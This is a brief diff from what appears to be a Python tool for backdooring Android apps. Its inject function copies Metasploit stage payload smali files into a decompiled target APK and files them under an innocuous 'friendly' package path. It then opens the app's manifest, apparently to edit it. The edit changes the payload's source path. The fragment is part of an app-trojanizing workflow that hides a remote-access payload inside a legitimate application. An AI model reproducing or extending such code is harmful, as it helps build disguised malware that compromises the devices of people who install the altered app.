@@ -35,7 +35,7 @@ def inject(mainapk):
 	os.system(mk)
 	mk = "mkdir %s/smali/com/friendly/stage"%mainapk.split('.')[0]
 	os.system(mk)
-	cp = "cp temp/smali/com/friendly/stage/Payload*  %s/smali/com/friendly/stage/"%mainapk.split('.')[0]
+	cp = "cp temp/smali/com/metasploit/stage/Payload*  %s/smali/com/friendly/stage/"%mainapk.split('.')[0]
 	os.system(cp)
 	filemanifest = "%s/AndroidManifest.xml"%mainapk.split('.')[0]
 	fhandle = open(filemanifest,'r')
